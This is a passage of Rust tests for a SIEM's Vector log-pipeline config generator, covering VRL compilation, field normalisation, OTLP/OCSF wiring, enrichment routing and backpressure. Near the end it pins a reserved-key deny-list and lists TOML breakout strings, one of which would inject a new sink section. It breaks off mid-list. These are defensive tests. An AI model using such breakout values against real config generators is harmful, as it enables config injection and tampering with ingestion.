// SPDX-License-Identifier: AGPL-3.0-or-later

    use super::*;

    /// Extract every `source = '''...'''` body from a Vector TOML config string.
    fn extract_vrl_blocks(content: &str) -> Vec<&str> {
        let opener = "source = '''";
        let mut blocks = Vec::new();
        let mut rest = content;
        while let Some(start) = rest.find(opener) {
            let body = &rest[start + opener.len()..];
            match body.find("'''") {
                Some(end) => {
                    blocks.push(&body[..end]);
                    rest = &body[end + 3..];
                }
                None => break,
            }
        }
        blocks
    }

    /// Vector refuses to load configs with VRL diagnostics, so a single bad
    /// `??` or unhandled fallible call in `pipeline_config_content()` takes
    /// ingestion down for every tenant on next regen. Compile every VRL block
    /// in the static template here so the bug is caught at `cargo test` time.
    #[test]
    fn pipeline_config_vrl_blocks_compile() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let content = VectorConfigManager::pipeline_config_content();
        let blocks = extract_vrl_blocks(content);
        assert!(!blocks.is_empty(), "expected ≥1 VRL block in pipeline config");

        let fns = vrl::stdlib::all();
        let failures: Vec<String> = blocks
            .iter()
            .enumerate()
            .filter_map(|(idx, block)| {
                compile(block, &fns).err().map(|diagnostics| {
                    let formatted = Formatter::new(block, diagnostics).to_string();
                    format!("block #{idx}:\n{formatted}")
                })
            })
            .collect();

        assert!(
            failures.is_empty(),
            "pipeline VRL failed to compile:\n{}",
            failures.join("\n----\n")
        );
    }

    #[test]
    fn generated_clickhouse_sinks_use_fixed_concurrency_and_local_logs() {
        let generated = [
            VectorConfigManager::pipeline_config_content().to_string(),
            VectorConfigManager::enrichment_lane_content().to_string(),
            VectorConfigManager::ocsf_sink_content(&["ocsf_prepare".to_string()]),
        ];
        for content in generated {
            assert!(
                !content.contains("concurrency = \"adaptive\""),
                "ClickHouse sinks must not use adaptive concurrency"
            );
            assert!(
                content.contains("VECTOR_CLICKHOUSE_REQUEST_CONCURRENCY:-6"),
                "ClickHouse sinks must use the bounded concurrency setting"
            );
            if content.contains("type = \"disk\"") {
                assert!(
                    content.contains("VECTOR_DISK_BUFFER_MAX_BYTES:-268435488"),
                    "durable ClickHouse buffers must use the host-sized per-component setting"
                );
            }
        }
        assert!(
            VectorConfigManager::pipeline_config_content()
                .contains("table = \"${CLICKHOUSE_LOGS_TABLE:-logs_ingest}\""),
            "the generated event sink must default to shard-local logs"
        );
    }

    /// NAN-1415: hex hash case is encoding noise — file_hash / process_hash are
    /// canonicalized to lowercase in the clickhouse_mapping stage (the chokepoint
    /// every log event flows through), so new rows compare raw and the IOC/TI
    /// enrichment dicts that key on lower(hash) join consistently. Pin the
    /// downcase wrappers: silently dropping one reintroduces mixed-case ingest
    /// while history is being relied on to converge.
    #[test]
    fn pipeline_config_canonicalizes_hashes_lowercase() {
        let content = VectorConfigManager::pipeline_config_content();
        assert!(
            content.contains(r#".file_hash = downcase(to_string(.file_hash) ?? "")"#),
            "clickhouse_mapping must downcase file_hash at ingest (NAN-1415)"
        );
        assert!(
            content.contains(r#".process_hash = downcase(to_string(.process_hash) ?? "")"#),
            "clickhouse_mapping must downcase process_hash at ingest (NAN-1415)"
        );
    }

    /// NAN-1646 (NAN-1632 finding 3.9): `dvc_ip` was the only lowercase-candidate
    /// column in the clickhouse_mapping stage WITHOUT an ingest downcase. It joins
    /// `LOWERCASE_NORMALIZED_FIELDS` in the follow-up codegen half (NAN-1647), so
    /// equality hunts compare the column RAW — sound only while every new row is
    /// stored lowercase (uppercase IPv6 hex would otherwise be silently
    /// unfindable). Pin the wrapper: dropping it reintroduces mixed-case ingest
    /// under a raw-compare query path.
    #[test]
    fn pipeline_config_canonicalizes_dvc_ip_lowercase() {
        let content = VectorConfigManager::pipeline_config_content();
        assert!(
            content.contains(r#".dvc_ip = downcase(to_string(.dvc_ip) ?? "")"#),
            "clickhouse_mapping must downcase dvc_ip at ingest (NAN-1646)"
        );
    }

    /// NAN-1378: `ocsf_prepare` reads `%source_type` (with an `?? "unknown"`
    /// fallback) to restore provenance after the OCSF parsers' `. = {...}`
    /// root-replacement wipes `.source_type`. The writer lives in 00-base.toml's
    /// `source_type_extract` remap; if it goes missing, every Vector-ingested
    /// OCSF row silently lands as source_type='unknown'. Pin the writer here.
    #[test]
    fn base_config_stashes_source_type_metadata() {
        let base = include_str!("../../../../../config/vector/00-base.toml");
        assert!(
            base.contains("%source_type = downcase(source_type)"),
            "00-base.toml must stash `%source_type` event metadata for the OCSF lane"
        );
    }

    /// NAN-1378: same guard as `pipeline_config_vrl_blocks_compile`, for the
    /// statically embedded 00-base.toml (deployed verbatim via `include_str!`).
    /// A VRL diagnostic here would take ingestion down on the next Vector reload.
    #[test]
    fn base_config_vrl_blocks_compile() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let content = include_str!("../../../../../config/vector/00-base.toml");
        let blocks = extract_vrl_blocks(content);
        assert!(!blocks.is_empty(), "expected ≥1 VRL block in 00-base.toml");

        let fns = vrl::stdlib::all();
        let failures: Vec<String> = blocks
            .iter()
            .enumerate()
            .filter_map(|(idx, block)| {
                compile(block, &fns).err().map(|diagnostics| {
                    let formatted = Formatter::new(block, diagnostics).to_string();
                    format!("block #{idx}:\n{formatted}")
                })
            })
            .collect();

        assert!(
            failures.is_empty(),
            "00-base.toml VRL failed to compile:\n{}",
            failures.join("\n----\n")
        );
    }

    /// NAN-1556: same guard as `base_config_vrl_blocks_compile`, for the OTLP
    /// source (config/vector/03-otlp-source.toml). `otlp_logs_prep` maps the OTLP
    /// LogRecord envelope (severity / service / attributes / trace ids); a VRL
    /// diagnostic here would take OTLP ingestion down on the next Vector reload.
    #[test]
    fn otlp_source_vrl_blocks_compile() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let content = include_str!("../../../../../config/vector/03-otlp-source.toml");
        let blocks = extract_vrl_blocks(content);
        assert!(
            !blocks.is_empty(),
            "expected ≥1 VRL block in 03-otlp-source.toml"
        );

        let fns = vrl::stdlib::all();
        let failures: Vec<String> = blocks
            .iter()
            .enumerate()
            .filter_map(|(idx, block)| {
                compile(block, &fns).err().map(|diagnostics| {
                    let formatted = Formatter::new(block, diagnostics).to_string();
                    format!("block #{idx}:\n{formatted}")
                })
            })
            .collect();

        assert!(
            failures.is_empty(),
            "03-otlp-source.toml VRL failed to compile:\n{}",
            failures.join("\n----\n")
        );
    }

    /// NAN-1556: pin the OTLP envelope→column wiring. `otlp_logs_prep` must set
    /// severity, route resource `service.name` → src_host, and build the `ext`
    /// tail; and the static pipeline must carry severity/ext/trace_id/span_id
    /// through `prepare_output` (the generic OTLP-log path) or those columns
    /// silently drop (the bug NAN-1556 fixes). Pin both halves so a refactor
    /// can't quietly regress the mapping.
    #[test]
    fn otlp_envelope_mapping_is_wired() {
        let otlp = include_str!("../../../../../config/vector/03-otlp-source.toml");
        assert!(
            otlp.contains(".severity = sev"),
            "otlp_logs_prep must set .severity from severity_text/number"
        );
        assert!(
            otlp.contains(r#".resources."service.name""#),
            "otlp_logs_prep must read resource service.name -> src_host"
        );
        assert!(
            otlp.contains(".ext = tail"),
            "otlp_logs_prep must build the ext tail from attributes + resources"
        );

        let pipeline = VectorConfigManager::pipeline_config_content();
        assert!(
            pipeline.contains("otlp_severity = .severity"),
            "prepare_output must carry .severity through the rebuild"
        );
        assert!(
            pipeline.contains("otlp_ext = .ext"),
            "prepare_output must carry .ext through the rebuild"
        );
        assert!(
            pipeline.contains("\"trace_id\", \"span_id\","),
            "trace_id/span_id must be explicit_columns (mapped to columns, not swept into ext)"
        );
    }

    /// NAN-1576: pin the traces/metrics ingest wiring. Vector's `opentelemetry`
    /// source emits spans as TRACE events and metrics as METRIC events, but the
    /// `clickhouse` sink only accepts LOG events and silently drops the others
    /// (the sink's received_events_total stays 0 — nothing reaches otel_spans /
    /// otel_metrics). The `trace_to_log` / `metric_to_log` converters are the
    /// load-bearing fix; without them ingestion regresses to a silent zero. Also
    /// pin that the preps re-encode into the OTLP/JSON shape the MVs read
    /// (camelCase `traceId`/`startTimeUnixNano`, epoch-nano `timeUnixNano`), since
    /// Vector decodes into snake_case/RFC3339/flat-map and the MV's JSONExtract
    /// path would silently extract nothing from the native shape.
    #[test]
    fn otlp_traces_metrics_ingest_is_wired() {
        let otlp = include_str!("../../../../../config/vector/03-otlp-source.toml");

        // Event-type conversion (the whole bug: TRACE/METRIC events can't enter a
        // log-only clickhouse sink).
        assert!(
            otlp.contains(r#"type = "trace_to_log""#),
            "spans must pass through trace_to_log or the clickhouse sink drops them (recv=0)"
        );
        assert!(
            otlp.contains(r#"type = "metric_to_log""#),
            "metrics must pass through metric_to_log or the clickhouse sink drops them (recv=0)"
        );

        // Reshape to the OTLP/JSON the MVs (clickhouse/138, /140) read.
        assert!(
            otlp.contains(r#""traceId""#) && otlp.contains(r#""startTimeUnixNano""#),
            "otlp_traces_prep must emit camelCase OTLP/JSON span keys the otel_spans MV reads"
        );
        assert!(
            otlp.contains(r#""timeUnixNano""#),
            "otlp_metrics_prep must emit epoch-nano timeUnixNano the otel_metrics MV reads"
        );
    }

    /// NAN-1325: the generic OCSF Base Event lane's VRL must compile, or an OCSF
    /// deploy would take ingestion down on the next Vector reload. Compiled here
    /// independent of `NANO_SCHEMA_PROFILE` (the block is appended only under OCSF,
    /// but the VRL itself must always be valid).
    #[test]
    fn generic_ocsf_prepare_vrl_compiles() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let blocks = extract_vrl_blocks(VectorConfigManager::GENERIC_OCSF_PREPARE_BLOCK);
        assert_eq!(
            blocks.len(),
            1,
            "expected exactly one VRL block in the generic OCSF lane"
        );
        let fns = vrl::stdlib::all();
        if let Err(diagnostics) = compile(blocks[0], &fns) {
            panic!(
                "generic OCSF prepare VRL failed to compile:\n{}",
                Formatter::new(blocks[0], diagnostics)
            );
        }
    }

    /// NAN-1325: the generic Base Event row must carry `class_uid = 0` and preserve
    /// the raw record in `event` so `ocsf_logs` materializes a searchable Base Event.
    #[test]
    fn generic_ocsf_prepare_emits_base_event() {
        let block = VectorConfigManager::GENERIC_OCSF_PREPARE_BLOCK;
        assert!(block.contains("\"class_uid\": 0"), "must set class_uid = 0");
        assert!(
            block.contains("\"event\": ocsf_event"),
            "must emit the Base Event as `event`"
        );
        // NAN-4903: the raw record is vendor data — it rides under `unmapped`, so
        // arbitrary keys never consume `event`'s dynamic-path budget.
        assert!(
            block.contains("\"unmapped\": raw_record"),
            "must preserve the raw record under `unmapped`"
        );
        assert!(
            block.contains("inputs = [\"generic_parser\"]"),
            "must fork off the generic_parser fall-through"
        );
    }

    /// NAN-1124: same guard as `pipeline_config_vrl_blocks_compile`, for the
    /// push enrichment lane. A bad `??`/fallible-call in `_enrichment.toml`
    /// would take the enrichment lane down on next regen — caught here at
    /// `cargo test` time rather than on a live Vector reload.
    #[test]
    fn enrichment_lane_vrl_blocks_compile() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let content = VectorConfigManager::enrichment_lane_content();
        let blocks = extract_vrl_blocks(content);
        assert!(
            !blocks.is_empty(),
            "expected ≥1 VRL block in the enrichment lane"
        );

        let fns = vrl::stdlib::all();
        let failures: Vec<String> = blocks
            .iter()
            .enumerate()
            .filter_map(|(idx, block)| {
                compile(block, &fns).err().map(|diagnostics| {
                    let formatted = Formatter::new(block, diagnostics).to_string();
                    format!("block #{idx}:\n{formatted}")
                })
            })
            .collect();

        assert!(
            failures.is_empty(),
            "enrichment lane VRL failed to compile:\n{}",
            failures.join("\n----\n")
        );
    }

    /// Build a minimal enrichment `Parser` for generator tests.
    fn enrichment_test_parser(enrich_kind: &str, target_table: &str, normalize_vrl: &str) -> Parser {
        Parser {
            activation_parked: false,
            id: uuid::Uuid::new_v4(),
            name: format!("test_{enrich_kind}"),
            description: None,
            source_type: "nano_enrich".to_string(),
            parser_vrl: String::new(),
            output_fields: None,
            feed_id: None,
            dispatch_source_config_id: None,
            dispatch_route_name: None,
            enabled: true,
            validated: true,
            validation_error: None,
            category: None,
            vendor: None,
            product: None,
            kind: "enrichment".to_string(),
            enrich_kind: Some(enrich_kind.to_string()),
            enrich_source: Some(enrich_kind.to_string()),
            target_table: Some(target_table.to_string()),
            normalize_vrl: Some(normalize_vrl.to_string()),
            namespace: "default".to_string(),
            timezone: "UTC".to_string(),
            match_values: None,
            sampling_ratio: None,
            sampling_exclude_condition: None,
            extension_vrl: None,
            extension_enabled: false,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    /// Build a minimal enabled/disabled log `Parser` for OCSF-sink wiring tests.
    fn log_test_parser(name: &str, enabled: bool) -> Parser {
        Parser {
            activation_parked: false,
            id: uuid::Uuid::new_v4(),
            name: name.to_string(),
            description: None,
            source_type: name.to_string(),
            parser_vrl: String::new(),
            output_fields: None,
            feed_id: None,
            dispatch_source_config_id: None,
            dispatch_route_name: None,
            enabled,
            validated: true,
            validation_error: None,
            category: None,
            vendor: None,
            product: None,
            kind: "log".to_string(),
            enrich_kind: None,
            enrich_source: None,
            target_table: None,
            normalize_vrl: None,
            namespace: "default".to_string(),
            timezone: "UTC".to_string(),
            match_values: None,
            sampling_ratio: None,
            sampling_exclude_condition: None,
            extension_vrl: None,
            extension_enabled: false,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    // ------------------------------------------------------------------
    // NAN-2305: two log sources, one generated filename
    // ------------------------------------------------------------------

    /// The gap NAN-2247 leaves open.
    ///
    /// That check guards the source_type CLAIM, and only catches a name
    /// collision when neither parser carries `match_values` (the claim then
    /// falls back to `safe_name`). Give them distinct `match_values` — the
    /// normal case for any real parser — and the claims differ, the check
    /// passes, and both parsers still resolve to `my_source.toml`. Before the
    /// guard this returned `Ok(())` with one file on disk: whichever parser
    /// the loop wrote last. The other log source was simply not ingested.
    #[tokio::test]
    async fn deploy_refuses_two_parsers_that_generate_one_filename() {
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let manager = VectorConfigManager::new(tmp.path());

        let a = Parser {
            match_values: Some(vec!["sysmon_json".to_string()]),
            ..log_test_parser("My Source", true)
        };
        let b = Parser {
            match_values: Some(vec!["sysmon_xml".to_string()]),
            ..log_test_parser("my-source", true)
        };

        let err = manager
            .deploy_parsers(&[a, b])
            .await
            .expect_err("two parsers generating one filename must fail the deploy");

        let msg = err.to_string();
        assert!(msg.contains("my_source"), "must name the identifier: {msg}");
        assert!(msg.contains("My Source"), "must name both claimants: {msg}");
        assert!(msg.contains("my-source"), "must name both claimants: {msg}");
        assert!(
            !manager.parsers_dir.join("my_source.toml").exists(),
            "a refused deploy must leave the active tree untouched"
        );
    }

    /// The nastier half, and one NAN-2247 cannot see at all because it only
    /// considers ENABLED parsers.
    ///
    /// The per-parser loop's disabled branch REMOVES `<safe_name>.toml`. So an
    /// enabled source and a disabled namesake in one deploy meant the enabled
    /// source's config was deleted — or never survived — purely on iteration
    /// order, with the deploy reporting success either way.
    #[tokio::test]
    async fn deploy_refuses_an_enabled_parser_and_a_disabled_namesake() {
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let manager = VectorConfigManager::new(tmp.path());

        let err = manager
            .deploy_parsers(&[
                log_test_parser("My Source", true),
                log_test_parser("my-source", false),
            ])
            .await
            .expect_err("a disabled namesake deletes the enabled source's config");

        assert!(err.to_string().contains("my_source"), "{err}");
    }

    /// NAN-1584: the OCSF sink must fork every ENABLED, non-enrichment parser's
    /// `_ocsf_prepare` output (plus the always-on generic Base Event lane). This
    /// shared computation backs both the active `write_ocsf_sink_config` and the
    /// staged `write_staged_ocsf_sink_config`; the staged path previously omitted
    /// the sink entirely, so single-source publish dropped OCSF parser output.
    /// (`_for` variant dodges the env-racy `ocsf_mode` gate.)
    #[test]
    fn ocsf_sink_wires_each_enabled_parser_fork() {
        let parsers = vec![
            log_test_parser("apache", true),
            log_test_parser("sysmon_json", true),
            log_test_parser("disabled_src", false),
            enrichment_test_parser("identity", "user_registry", ""),
        ];

        // UDM: no OCSF sink at all.
        assert!(
            VectorConfigManager::ocsf_sink_inputs_for(false, &parsers).is_empty(),
            "UDM must not emit an OCSF sink"
        );

        // OCSF: enabled log parsers' forks + generic; disabled + enrichment
        // excluded. NAN-5132: reached through the fixed OCSF slots defined in
        // the combiner, so the sink's own `inputs` never change.
        let inputs = VectorConfigManager::ocsf_sink_inputs_for(true, &parsers);
        let content = VectorConfigManager::ocsf_sink_content(&inputs);
        assert!(content.contains("[sinks.clickhouse_ocsf_logs]"), "{content}");
        let combiner = VectorConfigManager::combiner_config_content_for(&parsers, true);
        let mut reached =
            crate::parsers::vector_config::fanin_slots::resolved_inputs(&[&combiner, &content], "clickhouse_ocsf_logs");
        reached.sort();
        assert_eq!(
            reached,
            vec![
                "apache_ocsf_prepare".to_string(),
                "generic_ocsf_prepare".to_string(),
                "sysmon_json_ocsf_prepare".to_string(),
            ],
            "OCSF sink must fork every enabled log parser + the generic lane, \
             excluding disabled and enrichment parsers"
        );
    }

    #[test]
    fn parser_health_combiner_bypasses_sampling_and_covers_ocsf_successes() {
        let mut sampled = log_test_parser("limacharlie", true);
        sampled.sampling_ratio = Some(0.1);
        let disabled = log_test_parser("disabled_src", false);

        // NAN-5132: fan-ins read slots; resolve them to the parser components.
        use crate::parsers::vector_config::fanin_slots::resolved_inputs;
        let udm =
            VectorConfigManager::combiner_config_content_for(&[sampled.clone(), disabled.clone()], false);
        assert_eq!(
            resolved_inputs(&[&udm], "db_parsers_combined"),
            vec!["limacharlie_sample".to_string()],
            "persisted UDM stream must retain configured sampling: {udm}"
        );
        assert_eq!(
            resolved_inputs(&[&udm], "db_parser_health"),
            vec!["limacharlie_output".to_string()],
            "health must observe the unsampled output and exclude disabled parsers: {udm}"
        );
        assert!(!udm.contains("disabled_src_output"), "{udm}");

        let ocsf = VectorConfigManager::combiner_config_content_for(&[sampled, disabled], true);
        assert_eq!(
            resolved_inputs(&[&ocsf], "db_parser_health"),
            vec!["limacharlie_output".to_string(), "limacharlie_ocsf_prepare".to_string()],
            "OCSF health must combine UDM fallback/failures with native successes: {ocsf}"
        );

        let vrl_blocks = extract_vrl_blocks(&ocsf);
        let health_vrl = vrl_blocks.last().expect("health mapper VRL");
        if let Err(diags) = vrl::compiler::compile(health_vrl, &vrl::stdlib::all()) {
            panic!(
                "parser-health mapper VRL failed to compile:\n{}",
                vrl::diagnostic::Formatter::new(health_vrl, diags)
            );
        }

        let pipeline = VectorConfigManager::pipeline_config_content();
        assert!(
            pipeline.contains("[sinks.clickhouse_parser_health]")
                && pipeline.contains("table = \"${CLICKHOUSE_PARSER_HEALTH_TABLE:-parser_health_ingest}\""),
            "the pre-sampling health branch must terminate in the Null-engine ingress: {pipeline}"
        );
    }

    /// NAN-1149: the dynamically-generated enrichment lane must produce a valid,
    /// durable, isolated topology — the normalize VRL compiles, the per-table
    /// sink uses a blocking disk buffer with sink acks off, and the persistent
    /// dead-letter unions every rejected output.
    #[test]
    fn generated_enrichment_lane_is_valid_and_compliant() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let normalize_vrl = "external_id = to_string(.external_id) ?? \"\"\n\
             if external_id == \"\" { abort }\n\
             . = { \"external_id\": external_id, \"version\": to_int(.version) ?? 0 }";
        let parser = enrichment_test_parser("identity", "user_registry", normalize_vrl);

        let lane = VectorConfigManager::generate_enrichment_lane(&[&parser]);

        assert!(
            lane.contains("[transforms.enrichment_normalize_identity]"),
            "missing normalize transform:\n{lane}"
        );
        assert!(
            lane.contains("inputs = [\"enrichment_router.identity\"]"),
            "normalize must consume enrichment_router.identity"
        );
        assert!(
            lane.contains("[sinks.clickhouse_user_registry]") && lane.contains("table = \"user_registry\""),
            "missing per-target_table sink"
        );
        assert!(
            lane.contains("type = \"disk\"") && lane.contains("when_full = \"block\""),
            "enrichment sinks must hand off to blocking disk buffers"
        );
        assert!(
            lane.contains("enabled = false"),
            "enrichment sink acknowledgements must be off (NAN-1114)"
        );
        assert!(
            lane.contains("enrichment_ingest_prepare.dropped")
                && lane.contains("enrichment_router._unmatched")
                && lane.contains("enrichment_normalize_identity.dropped"),
            "dead-letter must union source, router, and normalize rejects"
        );

        // A repo-sourced parser must never ship VRL that Vector rejects on reload.
        let fns = vrl::stdlib::all();
        for (idx, block) in extract_vrl_blocks(&lane).iter().enumerate() {
            if let Err(diags) = compile(block, &fns) {
                panic!(
                    "generated enrichment VRL block #{idx} failed to compile:\n{}",
                    Formatter::new(block, diags)
                );
            }
        }
    }

    /// NAN-1151: two sources of the SAME kind (ad + entra, both identity) each
    /// get their own per-source normalize transform — the unlock route-by-kind
    /// couldn't express — yet share the one `user_registry` sink (keyed by
    /// target_table). Proves the per-source generator + the `enrichment_router`
    /// input names line up.
    #[test]
    fn generate_enrichment_lane_is_per_source_not_per_kind() {
        let mut ad = enrichment_test_parser("identity", "user_registry", ". = { \"external_id\": to_string(.id) ?? \"\" }");
        ad.enrich_source = Some("ad".to_string());
        ad.name = "ad_identity".to_string();
        let mut entra = enrichment_test_parser("identity", "user_registry", ". = { \"external_id\": to_string(.id) ?? \"\" }");
        entra.enrich_source = Some("entra".to_string());
        entra.name = "entra_identity".to_string();

        let lane = VectorConfigManager::generate_enrichment_lane(&[&ad, &entra]);

        // One normalize transform per source, each consuming its own route.
        assert!(lane.contains("[transforms.enrichment_normalize_ad]"), "missing ad normalize:\n{lane}");
        assert!(lane.contains("inputs = [\"enrichment_router.ad\"]"));
        assert!(lane.contains("[transforms.enrichment_normalize_entra]"), "missing entra normalize");
        assert!(lane.contains("inputs = [\"enrichment_router.entra\"]"));
        // Same target_table → a single shared sink fed by both.
        assert_eq!(
            lane.matches("[sinks.clickhouse_user_registry]").count(),
            1,
            "both identity sources must share one user_registry sink"
        );
        assert!(
            lane.contains("inputs = [\"enrichment_normalize_ad\", \"enrichment_normalize_entra\"]"),
            "the user_registry sink must union both source transforms:\n{lane}"
        );
    }

    /// NAN-1151: the shared router block emits a per-source route for each
    /// deployed enrichment parser, and falls back to the legacy per-kind routes
    /// when none are deployed (so the static fallback lane's
    /// `enrichment_router.identity` input never dangles — NAN-867).
    #[test]
    fn enrichment_router_block_per_source_and_kind_fallback() {
        use crate::parsers::vector_config::router::enrichment_router_block;
        let mut ad = enrichment_test_parser("identity", "user_registry", "");
        ad.enrich_source = Some("ad".to_string());

        let per_source = enrichment_router_block(&[&ad], "\"auth_check\"");
        assert!(
            per_source.contains("ad = 'downcase(to_string(.source_type) ?? \"\") == \"nano_enrich\" && downcase(to_string(.source) ?? \"\") == \"ad\"'"),
            "expected per-source ad route:\n{per_source}"
        );
        let ad_route = per_source.lines().find(|l| l.starts_with("ad = ")).unwrap();
        assert!(!ad_route.contains("downcase(to_string(.kind)"), "a per-source route must not key by .kind");
        // NAN-3483: built-in normalizers cover every other identity source,
        // and an identity record of an unknown source dead-letters visibly.
        assert!(per_source.contains("\nokta = '"), "built-in okta route:\n{per_source}");
        assert!(per_source.contains("\nentra = '"), "built-in entra route:\n{per_source}");
        assert!(
            per_source.contains("unrouted_identity = 'downcase(to_string(.source_type) ?? \"\") == \"nano_enrich\" && downcase(to_string(.kind) ?? \"\") == \"identity\" && !includes([\"ad\", \"entra\", \"google\", \"okta\", \"workday\"], downcase(to_string(.source) ?? \"\"))'"),
            "unrouted identity route:\n{per_source}"
        );

        let fallback = enrichment_router_block(&[], "\"auth_check\"");
        // NAN-3483: the legacy `identity` route (the AD normalizer) only takes
        // AD or untagged records; each other source gets its own route.
        assert!(
            fallback.contains("identity = 'downcase(to_string(.source_type) ?? \"\") == \"nano_enrich\" && downcase(to_string(.kind) ?? \"\") == \"identity\" && includes([\"ad\", \"\"], downcase(to_string(.source) ?? \"\"))'"),
            "empty parser list must fall back to legacy per-kind routes:\n{fallback}"
        );
        assert!(fallback.contains("ip_context = '"), "{fallback}");
        assert!(
            fallback.contains("okta = 'downcase(to_string(.source_type) ?? \"\") == \"nano_enrich\" && downcase(to_string(.kind) ?? \"\") == \"identity\" && downcase(to_string(.source) ?? \"\") == \"okta\"'"),
            "{fallback}"
        );
        assert!(fallback.contains("unrouted_identity = '"), "{fallback}");
    }

    /// NAN-1151: `enrichment_lane_config` (shared by the active + staging writers)
    /// generates the per-source lane when ≥1 enrichment parser is enabled, and
    /// returns the committed static lane verbatim otherwise. This is what makes
    /// the `/deploy` stage→promote path deploy the dynamic lane instead of
    /// silently reverting to static.
    #[test]
    fn enrichment_lane_config_generates_for_enabled_else_static() {
        let parser = enrichment_test_parser(
            "identity",
            "user_registry",
            ". = { \"external_id\": to_string(.id) ?? \"\" }",
        );

        let generated = VectorConfigManager::enrichment_lane_config(&[parser.clone()]);
        assert!(
            generated.contains("GENERATED from deployed enrichment parsers"),
            "enabled parser must produce the generated lane:\n{generated}"
        );
        assert!(generated.contains("[transforms.enrichment_normalize_identity]"));
        // NAN-3483: plus a built-in normalizer per uncovered identity source
        // and the unrouted-identity dead-letter.
        for t in ["ad", "entra", "google", "okta", "workday", "unrouted_identity"] {
            assert!(generated.contains(&format!("[transforms.enrichment_normalize_{t}]")), "{t}:\n{generated}");
        }
        assert_enrichment_lane_topology(&generated).unwrap();
        assert!(enrichment_lane_backpressure_violations(&generated).is_empty());

        // Empty → the committed static lane plus the built-in normalizers.
        let fallback = VectorConfigManager::enrichment_lane_config(&[]);
        // NAN-4953: plus the tenant-VRL escape header on line 1.
        assert_eq!(
            fallback,
            format!(
                "{}\n{}",
                crate::vector_env::ENV_ESCAPED_TENANT_HEADER,
                VectorConfigManager::static_enrichment_lane()
            )
        );
        assert!(fallback.contains("[transforms.enrichment_normalize_ad]"));
        assert!(fallback.contains("inputs = [\"enrichment_router.identity\"]"), "AD keeps the legacy route");
        for t in ["entra", "google", "okta", "workday"] {
            assert!(fallback.contains(&format!("inputs = [\"enrichment_router.{t}\"]")), "{t}:\n{fallback}");
        }
        assert!(fallback.contains(
            "[sinks.clickhouse_user_registry]\ntype = \"clickhouse\"\ninputs = [\"enrichment_normalize_ad\", \"enrichment_normalize_entra\", \"enrichment_normalize_google\", \"enrichment_normalize_okta\", \"enrichment_normalize_workday\"]"
        ));
        assert!(fallback.contains("\"enrichment_normalize_unrouted_identity.dropped\""));
        // Valid TOML, and no backpressure on the shared ingest.
        toml::from_str::<toml::Table>(&crate::vector_env::substitute_like_vector(&fallback)).unwrap();
        VectorConfigManager::guard_enrichment_lane(&[], &fallback).unwrap();
        // Disabled-only → also static (no enabled parsers to generate from).
        let mut disabled = parser;
        disabled.enabled = false;
        assert_eq!(VectorConfigManager::enrichment_lane_config(&[disabled]), fallback);
    }

    /// The OOTB HEC source's `hec_normalize` VRL lifts `.event` keys onto the
    /// root. Without a reserved-key deny-list a forwarder can clobber routing
    /// fields like `.source_type` or `.auth_status` via the event body and
    /// bypass per-parser HEC filters. NAN-938.
    ///
    /// This test pins the deny-list in the shipped file: the VRL must compile,
    /// and every reserved key must be named in the `reserved` array.
    #[test]
    fn hec_source_vrl_has_reserved_event_key_denylist() {
        use vrl::compiler::compile;
        use vrl::diagnostic::Formatter;

        let content = include_str!("../../../../../config/vector/02-hec-source.toml");
        let blocks = extract_vrl_blocks(content);
        assert_eq!(blocks.len(), 1, "expected exactly one VRL block in 02-hec-source.toml");
        let block = blocks[0];

        let fns = vrl::stdlib::all();
        if let Err(diagnostics) = compile(block, &fns) {
            panic!(
                "02-hec-source.toml VRL failed to compile:\n{}",
                Formatter::new(block, diagnostics)
            );
        }

        for key in [
            "source_type",
            "namespace",
            "auth_status",
            "timestamp",
            "metadata",
            "ingest_time",
            "_inserted_at",
            "id",
            "ext",
            "message",
            "sourcetype",
            "splunk_sourcetype",
            "content_format",
            "routing_timestamp",
        ] {
            assert!(
                block.contains(&format!("\"{key}\"")),
                "reserved key \"{key}\" missing from hec_normalize deny-list — \
                 a Splunk forwarder could clobber .{key} via the .event body"
            );
        }

        assert!(
            block.contains("includes(reserved,"),
            "hec_normalize must gate the .event-keys lift on the reserved-key deny-list"
        );
    }

    /// NAN-1128 / NAN-5004: push enrichment has its own source/backpressure
    /// domain, so its blocking disk sinks cannot stall shared log sources. The
    /// lint still rejects any blocking or acking sink wired to a shared source.
    ///
    /// The lint parses the *shipped* topology — the binary-embedded pipeline
    /// (`pipeline_config_content`) and enrichment lane (`enrichment_lane_content`)
    /// plus the static base sources and the bootstrap router/combiner — so a
    /// regression is caught at `cargo test` time, never on a live Vector reload.
    #[test]
    fn shared_ingest_source_sinks_must_not_backpressure() {
        // The committed static enrichment lane must remain isolated in the
        // shipped topology. Logic lives in the shared guard so the same check
        // runs at deploy time on every generated lane.
        let violations = super::enrichment_lane_backpressure_violations(
            VectorConfigManager::enrichment_lane_content(),
        );
        assert!(
            violations.is_empty(),
            "shared-ingest-source backpressure lint failed:\n  {}",
            violations.join("\n  "),
        );
    }

    /// Positive coverage: a candidate sink that blocks a shared log-router
    /// output MUST be flagged — proving the guard isn't a silent no-op.
    #[test]
    fn backpressure_guard_flags_a_blocking_enrichment_sink() {
        let bad = r#"
[sinks.clickhouse_user_registry]
type = "clickhouse"
inputs = ["source_router.generic"]

[sinks.clickhouse_user_registry.buffer]
type = "memory"
when_full = "block"

[sinks.clickhouse_user_registry.acknowledgements]
enabled = true
"#;
        let violations = super::enrichment_lane_backpressure_violations(bad);
        assert!(
            violations.iter().any(|v| v.contains("clickhouse_user_registry")),
            "a blocking + acking sink reaching shared ingest must be flagged, got {violations:?}"
        );
    }

    // ---- NAN-1197: enrichment-lane injection guards --------------------------

    #[test]
    fn ch_table_ident_accepts_valid_rejects_breakouts() {
        for ok in ["user_registry", "ip_enrichments", "nanosiem.user_registry", "_t"] {
            assert!(is_valid_ch_table_ident(ok), "{ok} should be valid");
        }
        for bad in [
            "",
            "user_registry\"",
            "user registry",
            "user_registry\"\n[sinks.x]",
